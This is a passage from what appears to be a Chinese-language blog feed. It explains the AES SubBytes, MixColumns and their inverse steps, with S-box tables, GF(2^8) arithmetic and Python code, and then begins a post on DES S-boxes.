class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>],<br>    [<span class="hljs-number">0xD0</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x6B</span>],<br>    [<span class="hljs-number">0x3A</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x73</span>],<br>    [<span class="hljs-number">0x96</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x6E</span>],<br>    [<span class="hljs-number">0x47</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1B</span>],<br>    [<span class="hljs-number">0xFC</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xF4</span>],<br>    [<span class="hljs-number">0x1F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>],<br>    [<span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xEF</span>],<br>    [<span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>],<br>    [<span class="hljs-number">0x17</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x7D</span>]<br>]<br></code></pre></td></tr></table></figure><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>Inv_Sub_Bytes操作的步骤如下：</p><ol><li>对于状态的每个字节，将其作为Inv_S-Box的行索引和列索引。</li><li>使用Inv_S-Box查找对应的逆字节值。</li><li>用找到的逆字节值替换原状态中的字节。</li></ol><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_sub_bytes</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    使用S盒对状态矩阵进行字节代换操作。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        state: 4x4矩阵，表示状态</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回值：</span><br><span class="hljs-string">        无，直接修改原始状态矩阵</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            byte = state[i][j]<br>            row = (byte &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span><br>            col = byte &amp; <span class="hljs-number">0x0F</span><br>            state[i][j] = invsbox[row][col]<br><br></code></pre></td></tr></table></figure><p>这个操作对于确保AES算法的对称性和安全性至关重要，因为它确保了加密和解密过程是可逆的。</p><h1 id="Inv-Mix-Columns（逆列混合）："><a href="#Inv-Mix-Columns（逆列混合）：" class="headerlink" title="Inv_Mix_Columns（逆列混合）："></a>Inv_Mix_Columns（逆列混合）：</h1><p>Inv_Mix_Columns是AES（高级加密标准）算法中的另一个步骤，它是Mix_Columns的逆过程，用于解密过程中对数据进行逆变换。在AES算法中，Inv_Mix_Columns操作对状态的每个列进行逆变换，以恢复原始数据。<br>AES的Mix_Columns操作在加密过程中对每个列进行线性变换，而Inv_Mix_Columns则是在解密过程中进行逆变换。这个操作涉及到矩阵乘法，使用了一个固定的逆矩阵来对列进行变换。</p><h2 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h2><p>Inv_Mix_Columns操作的步骤如下：</p><ol><li><p>对于状态的每个列，将其视为一个4元素的向量。</p></li><li><p>使用固定的逆矩阵对每个列向量进行矩阵乘法。在AES中，这个逆矩阵是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">Inverse_column_matrix = [<br>    [<span class="hljs-number">0x0e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x09</span>],<br>    [<span class="hljs-number">0x09</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x0d</span>],<br>    [<span class="hljs-number">0x0d</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x0b</span>],<br>    [<span class="hljs-number">0x0b</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0e</span>]<br>]<br></code></pre></td></tr></table></figure><p>其中，数字是十六进制表示的。这个矩阵与Mix_Columns操作中使用的矩阵互为逆矩阵。</p></li><li><p>将矩阵乘法的结果模上多项式( x^4 + 1 )（在GF(2^8)域中），以得到一个新的列向量。</p></li><li><p>用新的列向量替换原状态中的列。<br>这个操作确保了AES算法的扩散性，即使得明文和密文之间的相关性降低，从而提高了算法的安全性。在解密过程中，Inv_Mix_Columns操作与加密过程中的Mix_Columns操作相互抵消，从而恢复出原始明文。</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">galois_mult</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-comment"># GF(2^8)上的有限域乘法</span><br>    p = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>:<br>            p ^= a<br>        high_bit_set = a &amp; <span class="hljs-number">0x80</span><br>        a &lt;&lt;= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> high_bit_set:<br>            a ^= <span class="hljs-number">0x1B</span>  <span class="hljs-comment"># x^8 + x^4 + x^3 + x^1 + x^0</span><br>        b &gt;&gt;= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inv_mix_columns</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    对状态矩阵进行列混合操作。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        state: 4x4矩阵，表示状态</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回值：</span><br><span class="hljs-string">        无，直接修改原始状态矩阵</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    new_state = [[<span class="hljs-number">0</span>] * <span class="hljs-number">4</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            new_state[r][c] = (<br>                    galois_mult(state[<span class="hljs-number">0</span>][c], Inverse_column_matrix[r][<span class="hljs-number">0</span>]) ^  <span class="hljs-comment"># 第一列的乘法</span><br>                    galois_mult(state[<span class="hljs-number">1</span>][c], Inverse_column_matrix[r][<span class="hljs-number">1</span>]) ^  <span class="hljs-comment"># 第二列的乘法</span><br>                    galois_mult(state[<span class="hljs-number">2</span>][c], Inverse_column_matrix[r][<span class="hljs-number">2</span>]) ^  <span class="hljs-comment"># 第三列的乘法</span><br>                    galois_mult(state[<span class="hljs-number">3</span>][c], Inverse_column_matrix[r][<span class="hljs-number">3</span>])  <span class="hljs-comment"># 第四列的乘法</span><br>            )<br>    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            state[r][c] = new_state[r][c]<br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AES 之Sub_Bytes&amp;Mix_Columns（一）</title>
      <link href="/2024/04/24/AES_Subbytes&amp;Mixcolumns%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2024/04/24/AES_Subbytes&amp;Mixcolumns%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Sub-Bytes（字节代换）："><a href="#Sub-Bytes（字节代换）：" class="headerlink" title="Sub_Bytes（字节代换）："></a>Sub_Bytes（字节代换）：</h1><p>AES的字节代换其实就是一个简单的查表操作。</p><p>AES的S盒，也称为字节替换（SubBytes）步骤中的Rijndael S盒，是一个复杂的结构。它是一个16x16的查找表，接受8位输入并产生8位输出。AES的S盒是通过将每个字节与其逆元素在有限域GF(2^8)上相乘，然后通过一个固定的仿射变换得到的。这个S盒不仅具有非线性，而且还具有很好的扩散特性，能够抵抗各种密码分析技术。</p><p>其设计过程如下：</p><ul><li><strong>逆元素</strong>：首先，对于有限域GF(2^8)中的每个非零元素，找到它的逆元素。在GF(2^8)中，每个非零元素都有一个唯一的逆元素，使得它们的乘积模x^8 + x^4 + x^3 + x + 1等于1。</li><li><strong>仿射变换</strong>：接下来，对每个逆元素应用一个仿射变换。这个变换由一个可逆的线性变换和一个非线性变换组成，非线性变换是通过将每个字节与一个固定的多项式在GF(2^8)上相乘来实现的。</li><li><strong>优化</strong>：最后，对S盒进行优化，以确保它满足上述安全原则。这可能包括调整仿射变换的参数，以确保S盒对于各种密码分析技术具有足够的抵抗能力。</li></ul><h4 id="S盒定义："><a href="#S盒定义：" class="headerlink" title="S盒定义："></a>S盒定义：</h4><table><thead><tr><th align="center">行&#x2F;列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td align="center">0</td><td>0x63</td><td>0x7c</td><td>0x77</td><td>0x7b</td><td>0xf2</td><td>0x6b</td><td>0x6f</td><td>0xc5</td><td>0x30</td><td>0x01</td><td>0x67</td><td>0x2b</td><td>0xfe</td><td>0xd7</td><td>0xab</td><td>0x76</td></tr><tr><td align="center">1</td><td>0xca</td><td>0x82</td><td>0xc9</td><td>0x7d</td><td>0xfa</td><td>0x59</td><td>0x47</td><td>0xf0</td><td>0xad</td><td>0xd4</td><td>0xa2</td><td>0xaf</td><td>0x9c</td><td>0xa4</td><td>0x72</td><td>0xc0</td></tr><tr><td align="center">2</td><td>0xb7</td><td>0xfd</td><td>0x93</td><td>0x26</td><td>0x36</td><td>0x3f</td><td>0xf7</td><td>0xcc</td><td>0x34</td><td>0xa5</td><td>0xe5</td><td>0xf1</td><td>0x71</td><td>0xd8</td><td>0x31</td><td>0x15</td></tr><tr><td align="center">3</td><td>0x04</td><td>0xc7</td><td>0x23</td><td>0xc3</td><td>0x18</td><td>0x96</td><td>0x05</td><td>0x9a</td><td>0x07</td><td>0x12</td><td>0x80</td><td>0xe2</td><td>0xeb</td><td>0x27</td><td>0xb2</td><td>0x75</td></tr><tr><td align="center">4</td><td>0x09</td><td>0x83</td><td>0x2c</td><td>0x1a</td><td>0x1b</td><td>0x6e</td><td>0x5a</td><td>0xa0</td><td>0x52</td><td>0x3b</td><td>0xd6</td><td>0xb3</td><td>0x29</td><td>0xe3</td><td>0x2f</td><td>0x84</td></tr><tr><td align="center">5</td><td>0x53</td><td>0xd1</td><td>0x00</td><td>0xed</td><td>0x20</td><td>0xfc</td><td>0xb1</td><td>0x5b</td><td>0x6a</td><td>0xcb</td><td>0xbe</td><td>0x39</td><td>0x4a</td><td>0x4c</td><td>0x58</td><td>0xcf</td></tr><tr><td align="center">6</td><td>0xd0</td><td>0xef</td><td>0xaa</td><td>0xfb</td><td>0x43</td><td>0x4d</td><td>0x33</td><td>0x85</td><td>0x45</td><td>0xf9</td><td>0x02</td><td>0x7f</td><td>0x50</td><td>0x3c</td><td>0x9f</td><td>0xa8</td></tr><tr><td align="center">7</td><td>0x51</td><td>0xa3</td><td>0x40</td><td>0x8f</td><td>0x92</td><td>0x9d</td><td>0x38</td><td>0xf5</td><td>0xbc</td><td>0xb6</td><td>0xda</td><td>0x21</td><td>0x10</td><td>0xff</td><td>0xf3</td><td>0xd2</td></tr><tr><td align="center">8</td><td>0xcd</td><td>0x0c</td><td>0x13</td><td>0xec</td><td>0x5f</td><td>0x97</td><td>0x44</td><td>0x17</td><td>0xc4</td><td>0xa7</td><td>0x7e</td><td>0x3d</td><td>0x64</td><td>0x5d</td><td>0x19</td><td>0x73</td></tr><tr><td align="center">9</td><td>0x60</td><td>0x81</td><td>0x4f</td><td>0xdc</td><td>0x22</td><td>0x2a</td><td>0x90</td><td>0x88</td><td>0x46</td><td>0xee</td><td>0xb8</td><td>0x14</td><td>0xde</td><td>0x5e</td><td>0x0b</td><td>0xdb</td></tr><tr><td align="center">A</td><td>0xe0</td><td>0x32</td><td>0x3a</td><td>0x0a</td><td>0x49</td><td>0x06</td><td>0x24</td><td>0x5c</td><td>0xc2</td><td>0xd3</td><td>0xac</td><td>0x62</td><td>0x91</td><td>0x95</td><td>0xe4</td><td>0x79</td></tr><tr><td align="center">B</td><td>0xe7</td><td>0xc8</td><td>0x37</td><td>0x6d</td><td>0x8d</td><td>0xd5</td><td>0x4e</td><td>0xa9</td><td>0x6c</td><td>0x56</td><td>0xf4</td><td>0xea</td><td>0x65</td><td>0x7a</td><td>0xae</td><td>0x08</td></tr><tr><td align="center">C</td><td>0xba</td><td>0x78</td><td>0x25</td><td>0x2e</td><td>0x1c</td><td>0xa6</td><td>0xb4</td><td>0xc6</td><td>0xe8</td><td>0xdd</td><td>0x74</td><td>0x1f</td><td>0x4b</td><td>0xbd</td><td>0x8b</td><td>0x8a</td></tr><tr><td align="center">D</td><td>0x70</td><td>0x3e</td><td>0xb5</td><td>0x66</td><td>0x48</td><td>0x03</td><td>0xf6</td><td>0x0e</td><td>0x61</td><td>0x35</td><td>0x57</td><td>0xb9</td><td>0x86</td><td>0xc1</td><td>0x1d</td><td>0x9e</td></tr><tr><td align="center">E</td><td>0xe1</td><td>0xf8</td><td>0x98</td><td>0x11</td><td>0x69</td><td>0xd9</td><td>0x8e</td><td>0x94</td><td>0x9b</td><td>0x1e</td><td>0x87</td><td>0xe9</td><td>0xce</td><td>0x55</td><td>0x28</td><td>0xdf</td></tr><tr><td align="center">F</td><td>0x8c</td><td>0xa1</td><td>0x89</td><td>0x0d</td><td>0xbf</td><td>0xe6</td><td>0x42</td><td>0x68</td><td>0x41</td><td>0x99</td><td>0x2d</td><td>0x0f</td><td>0xb0</td><td>0x54</td><td>0xbb</td><td>0x16</td></tr></tbody></table><p>状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。<br>例如:<br>加密时输出的字节S1为0x12,则查S盒的第0x01行和0x02列，得到值0xc9,然后替换S1原有的0x12为0xc9；<br>加密时输出的字节S4为0xAB,则查S盒的第0x0A行和0x0B列，得到值0x62,然后替换S4原有的0xAB为0x62。</p><p>状态矩阵经字节代换后的图如下：</p><p><img src="/../img/AES_1.png" alt="字节变换"></p><h4 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_bytes</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    使用S盒对状态矩阵进行字节代换操作。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        state: 4x4矩阵，表示状态</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回值：</span><br><span class="hljs-string">        无，直接修改原始状态矩阵</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            byte = state[i][j]<br>            row = (byte &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span><br>            col = byte &amp; <span class="hljs-number">0x0F</span><br>            state[i][j] = sbox[row][col]<br></code></pre></td></tr></table></figure><h1 id="Mix-Columns（列混合）："><a href="#Mix-Columns（列混合）：" class="headerlink" title="Mix_Columns（列混合）："></a>Mix_Columns（列混合）：</h1><p>列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的矩阵相乘，得到混淆后的状态矩阵，如下图的公式所示：</p><p><img src="/../img/AES_2.png" alt="状态矩阵"></p><p>状态矩阵中的第j列(0 ≤j≤3)的列混合可以表示为下图所示：</p><p><img src="/../img/AES_3.png" alt="混合"></p><h4 id="列混合数学基础："><a href="#列混合数学基础：" class="headerlink" title="列混合数学基础："></a>列混合数学基础：</h4><p>矩阵乘法在AES的有限域GF(2^8)上进行，这意味着加法和乘法都是在模数为x^8 + x^4 + x^3 + x + 1的有限域中进行的。</p><p>加法：等价于两个字节的异或；</p><p>乘法：两元素多项式相乘，模m(x)；</p><p>例：57×83&#x3D;C1     </p><p>(x^6+x^4+x^2+x+1)*(x^7+x+1)&#x3D;x^7+x^6+1 mod m(x)</p><p>AES算法中定义m(x)多项式（不可约多项式）为：m(x)&#x3D;x^8+x^4+x^3+x+1（十六进制的011B)</p><h4 id="简化理解："><a href="#简化理解：" class="headerlink" title="简化理解："></a>简化理解：</h4><p>对于一个8位的二进制数来说，使用域上的乘法乘以0x02(00000010)等价于左移1位(低位补0)后，再根据情况同固定的数0x1B(00011011)进行异或运算。如果a7为1，则进行异或运算，否则不进行。</p><p>设S1 &#x3D; (a7 a6 a5 a4 a3 a2 a1 a0)，则0x02 * S1如下图所示：</p><p><img src="/../img/AES_4.png" alt="0x02 * S1"></p><p>结合律：类似地，乘以(00000100)可以拆分成两次乘以(00000010)的运算：</p><p><img src="/../img/AES_5.png" alt="结合律_1"></p><p>结合律：乘以(0000 0011)可以拆分成先分别乘以(0000 0001)和(0000 0010)，再将两个乘积异或：</p><p><img src="/../img/AES_6.png" alt="结合律_2"></p><h4 id="代码实现：-1"><a href="#代码实现：-1" class="headerlink" title="代码实现："></a>代码实现：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">galois_mult</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-comment"># GF(2^8)上的有限域乘法</span><br>    p = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>:<br>            p ^= a<br>        high_bit_set = a &amp; <span class="hljs-number">0x80</span><br>        a &lt;&lt;= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> high_bit_set:<br>            a ^= <span class="hljs-number">0x1B</span>  <span class="hljs-comment"># x^8 + x^4 + x^3 + x^1 + x^0</span><br>        b &gt;&gt;= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p &amp; <span class="hljs-number">0xFF</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mix_columns</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    对状态矩阵进行列混合操作。</span><br><span class="hljs-string"></span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        state: 4x4矩阵，表示状态</span><br><span class="hljs-string"></span><br><span class="hljs-string">    返回值：</span><br><span class="hljs-string">        无，直接修改原始状态矩阵</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    new_state = [[<span class="hljs-number">0</span>] * <span class="hljs-number">4</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            new_state[r][c] = (<br>                    galois_mult(state[<span class="hljs-number">0</span>][c], mix_columns_matrix[r][<span class="hljs-number">0</span>]) ^  <span class="hljs-comment"># 第一列的乘法</span><br>                    galois_mult(state[<span class="hljs-number">1</span>][c], mix_columns_matrix[r][<span class="hljs-number">1</span>]) ^  <span class="hljs-comment"># 第二列的乘法</span><br>                    galois_mult(state[<span class="hljs-number">2</span>][c], mix_columns_matrix[r][<span class="hljs-number">2</span>]) ^  <span class="hljs-comment"># 第三列的乘法</span><br>                    galois_mult(state[<span class="hljs-number">3</span>][c], mix_columns_matrix[r][<span class="hljs-number">3</span>])  <span class="hljs-comment"># 第四列的乘法</span><br>            )<br>    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            state[r][c] = new_state[r][c]<br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES_s盒</title>
      <link href="/2024/04/24/DES_s%E7%9B%92/"/>
      <url>/2024/04/24/DES_s%E7%9B%92/</url>
      
        <content type="html"><![CDATA[<h1 id="DES-s盒"><a href="#DES-s盒" class="headerlink" title="DES_s盒"></a>DES_s盒</h1><p>DES的S盒是一个固定的查找表，它接受6位输入并产生4位输出。DES有8个不同的S盒，每个S盒都是独立的，用于替代&#x2F;替换过程。DES的S盒设计考虑了当时的技术限制，以及对抗已知攻击的需求，包括差分密码分析和线性密码分析。DES的S盒具有非线性特性，这对于提高算法的安全性至关重要。</p><p>s盒代换代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 